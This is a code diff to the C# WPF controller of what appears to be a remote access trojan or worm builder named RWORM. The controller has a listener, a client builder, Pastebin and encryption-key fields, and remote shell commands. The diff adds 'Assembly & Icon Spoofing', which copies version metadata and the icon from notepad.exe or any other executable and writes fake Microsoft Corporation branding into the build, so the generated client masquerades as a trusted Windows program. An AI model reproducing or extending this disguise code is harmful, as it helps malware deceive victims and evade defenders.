@@ -118,6 +118,25 @@ namespace RWORM.GUI.ViewModels
         public string BuildPastebinRaw      { get => _buildPastebinRaw;      set { _buildPastebinRaw      = value; OnPropertyChanged(); } }
         public string BuildEncryptionKey    { get => _buildEncryptionKey;    set { _buildEncryptionKey    = value; OnPropertyChanged(); } }
 
+        // Assembly & Icon Spoofing options
+        private bool   _buildAssemblyEnabled = true;
+        private string _buildAssemblyTitle       = "Notepad";
+        private string _buildAssemblyDescription = "Notepad";
+        private string _buildAssemblyCompany     = "Microsoft Corporation";
+        private string _buildAssemblyProduct     = "Microsoft® Windows® Operating System";
+        private string _buildAssemblyCopyright   = "© Microsoft Corporation. All rights reserved.";
+        private string _buildAssemblyVersion     = "10.0.19041.1";
+        private string _buildAssemblyIcon        = "";
+
+        public bool   BuildAssemblyEnabled     { get => _buildAssemblyEnabled;     set { _buildAssemblyEnabled     = value; OnPropertyChanged(); } }
+        public string BuildAssemblyTitle       { get => _buildAssemblyTitle;       set { _buildAssemblyTitle       = value; OnPropertyChanged(); } }
+        public string BuildAssemblyDescription { get => _buildAssemblyDescription; set { _buildAssemblyDescription = value; OnPropertyChanged(); } }
+        public string BuildAssemblyCompany     { get => _buildAssemblyCompany;     set { _buildAssemblyCompany     = value; OnPropertyChanged(); } }
+        public string BuildAssemblyProduct     { get => _buildAssemblyProduct;     set { _buildAssemblyProduct     = value; OnPropertyChanged(); } }
+        public string BuildAssemblyCopyright   { get => _buildAssemblyCopyright;   set { _buildAssemblyCopyright   = value; OnPropertyChanged(); } }
+        public string BuildAssemblyVersion     { get => _buildAssemblyVersion;     set { _buildAssemblyVersion     = value; OnPropertyChanged(); } }
+        public string BuildAssemblyIcon        { get => _buildAssemblyIcon;        set { _buildAssemblyIcon        = value; OnPropertyChanged(); } }
+
         // ── Commands ──────────────────────────────────────────────────────────
         public ICommand ConnectCommand         { get; }
         public ICommand DisconnectCommand      { get; }
@@ -128,6 +147,9 @@ namespace RWORM.GUI.ViewModels
         public ICommand StopListenerCommand    { get; }
         public ICommand BuildCommand           { get; }
         public ICommand OpenBuilderCommand     { get; }
+        public ICommand CloneNotepadCommand    { get; }
+        public ICommand CloneFromExeCommand    { get; }
+        public ICommand BrowseIconCommand      { get; }
 
         // Client context commands — all accept ClientModel parameter
         public ICommand OpenShellCommand          { get; }
@@ -186,6 +208,12 @@ namespace RWORM.GUI.ViewModels
             StartListenerCommand  = new RelayCommand(_ => StartListener(), _ => !ListenerRunning);
             StopListenerCommand   = new RelayCommand(_ => StopListener(),  _ => ListenerRunning);
             BuildCommand          = new RelayCommand(_ => BuildClient());
+            CloneNotepadCommand   = new RelayCommand(_ => CloneNotepadAssemblyAndIcon());
+            CloneFromExeCommand   = new RelayCommand(_ => CloneFromExe());
+            BrowseIconCommand     = new RelayCommand(_ => BrowseIcon());
+
+            // Initialize default Notepad spoofing metadata & icon
+            CloneNotepadAssemblyAndIcon();
 
             // Context commands unconditionally return CanExecute=true so WPF never disables menu items
             OpenShellCommand          = new RelayCommand(p => OpenShell(p as ClientModel));
@@ -933,6 +961,96 @@ namespace RWORM.GUI.ViewModels
             else dispatcher.Invoke(Show);
         }
 
+        private void CloneNotepadAssemblyAndIcon()
+        {
+            try
+            {
+                var notepadPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe");
+                if (System.IO.File.Exists(notepadPath))
+                {
+                    CloneMetadataFromBinary(notepadPath);
+                    StatusMessage = "Notepad metadata & icon cloned successfully!";
+                }
+                else
+                {
+                    BuildAssemblyTitle       = "Notepad";
+                    BuildAssemblyDescription = "Notepad";
+                    BuildAssemblyCompany     = "Microsoft Corporation";
+                    BuildAssemblyProduct     = "Microsoft® Windows® Operating System";
+                    BuildAssemblyCopyright   = "© Microsoft Corporation. All rights reserved.";
+                    BuildAssemblyVersion     = "10.0.19041.1";
+                    StatusMessage = "Applied default Notepad metadata";
+                }
+            }
+            catch (Exception ex)
+            {
+                StatusMessage = $"Failed to clone notepad: {ex.Message}";
+            }
+        }
+
+        private void CloneFromExe()
+        {
+            var dlg = new Microsoft.Win32.OpenFileDialog
+            {
+                Title  = "Select Target Executable to Clone Metadata & Icon",
+                Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
+            };
+            if (dlg.ShowDialog() != true) return;
+
+            try
+            {
+                CloneMetadataFromBinary(dlg.FileName);
+                StatusMessage = $"Cloned metadata from {System.IO.Path.GetFileName(dlg.FileName)}";
+            }
+            catch (Exception ex)
+            {
+                StatusMessage = $"Failed to clone: {ex.Message}";
+            }
+        }
+
+        private void CloneMetadataFromBinary(string exePath)
+        {
+            var info = System.Diagnostics.FileVersionInfo.GetVersionInfo(exePath);
+            BuildAssemblyTitle       = !string.IsNullOrWhiteSpace(info.FileDescription) ? info.FileDescription : (!string.IsNullOrWhiteSpace(info.InternalName) ? info.InternalName : System.IO.Path.GetFileNameWithoutExtension(exePath));
+            BuildAssemblyDescription = !string.IsNullOrWhiteSpace(info.FileDescription) ? info.FileDescription : BuildAssemblyTitle;
+            BuildAssemblyCompany     = !string.IsNullOrWhiteSpace(info.CompanyName) ? info.CompanyName : "Microsoft Corporation";
+            BuildAssemblyProduct     = !string.IsNullOrWhiteSpace(info.ProductName) ? info.ProductName : BuildAssemblyTitle;
+            BuildAssemblyCopyright   = !string.IsNullOrWhiteSpace(info.LegalCopyright) ? info.LegalCopyright : "© All rights reserved.";
+            BuildAssemblyVersion     = $"{info.FileMajorPart}.{info.FileMinorPart}.{info.FileBuildPart}.{info.FilePrivatePart}";
+
+            try
+            {
+                var baseDir = System.IO.Path.GetFullPath(System.IO.Path.Combine(
+                    System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "",
+                    "..", "..", "..", ".."));
+                var assetsDir = System.IO.Path.Combine(baseDir, "GUI", "Resources", "Assets");
+                System.IO.Directory.CreateDirectory(assetsDir);
+                var icoTarget = System.IO.Path.Combine(assetsDir, $"{System.IO.Path.GetFileNameWithoutExtension(exePath)}_cloned.ico");
+
+                using var icon = System.Drawing.Icon.ExtractAssociatedIcon(exePath);
+                if (icon != null)
+                {
+                    using var fs = new System.IO.FileStream(icoTarget, System.IO.FileMode.Create, System.IO.FileAccess.Write);
+                    icon.Save(fs);
+                    BuildAssemblyIcon = icoTarget;
+                }
+            }
+            catch { }
+        }
+
+        private void BrowseIcon()
+        {
+            var dlg = new Microsoft.Win32.OpenFileDialog
+            {
+                Title  = "Select Icon File (.ico)",
+                Filter = "Icon Files (*.ico)|*.ico|All Files (*.*)|*.*"
+            };
+            if (dlg.ShowDialog() == true)
+            {
+                BuildAssemblyIcon = dlg.FileName;
+            }
+        }
+
         // ── Builder ───────────────────────────────────────────────────────────
         private async void BuildClient()
         {
@@ -1027,6 +1145,36 @@ namespace RWORM.GUI.ViewModels
                 var tempOutput  = System.IO.Path.Combine(baseDir, "output");
                 System.IO.Directory.CreateDirectory(tempOutput);
 
+                var propsFile = System.IO.Path.Combine(clientPath, "Directory.Build.props");
+                try
+                {
+                    if (BuildAssemblyEnabled)
+                    {
+                        var iconTag = (!string.IsNullOrWhiteSpace(BuildAssemblyIcon) && System.IO.File.Exists(BuildAssemblyIcon))
+                            ? $"<ApplicationIcon>{BuildAssemblyIcon}</ApplicationIcon>"
+                            : "";
+
+                        var propsXml = $@"<Project>
+  <PropertyGroup>
+    <AssemblyTitle>{BuildAssemblyTitle}</AssemblyTitle>
+    <Description>{BuildAssemblyDescription}</Description>
+    <Company>{BuildAssemblyCompany}</Company>
+    <Product>{BuildAssemblyProduct}</Product>
+    <Copyright>{BuildAssemblyCopyright}</Copyright>
+    <AssemblyVersion>{BuildAssemblyVersion}</AssemblyVersion>
+    <FileVersion>{BuildAssemblyVersion}</FileVersion>
+    {iconTag}
+  </PropertyGroup>
+</Project>";
+                        System.IO.File.WriteAllText(propsFile, propsXml);
+                    }
+                    else if (System.IO.File.Exists(propsFile))
+                    {
+                        System.IO.File.Delete(propsFile);
+                    }
+                }
+                catch { }
+
                 var psi = new System.Diagnostics.ProcessStartInfo
                 {
                     FileName               = "dotnet",
@@ -1055,6 +1203,7 @@ namespace RWORM.GUI.ViewModels
                     System.Windows.MessageBox.Show($"Build failed.\n{stderr}", "Error");
                 }
 
+                try { if (System.IO.File.Exists(propsFile)) System.IO.File.Delete(propsFile); } catch { }
                 try { System.IO.Directory.Delete(tempOutput, true); } catch { }
             }
             catch (Exception ex)
